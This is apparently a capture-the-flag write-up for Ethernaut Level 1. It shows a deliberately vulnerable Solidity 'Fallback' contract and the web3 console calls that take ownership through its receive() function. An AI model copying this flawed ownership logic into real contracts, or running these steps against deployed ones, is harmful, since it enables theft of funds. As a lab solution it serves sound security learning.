# Ethernaut Level1

-----

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

We need to trigger `reveive()` to claim ownership. In order to meet the conditions, we first call the public function `contribute()` through ABI to add value to state variable `contributions`.

```javascript
await contract.contribute.sendTransaction({from:player,to:contract.address, value:web3.utils.toWei('0.0000001','ether')})
```

We can now check the contributions:

```js
Number(await contract.getContribution())
```

Now we have meet the conditions, call `receive()` out of ABI to gain ownership:

```js
await sendTransaction({from: player, to: contract.address, value: web3.utils.toWei('0.00001', 'ether')})
```

You can check the ownership now:

```js
await contract.owner()
```

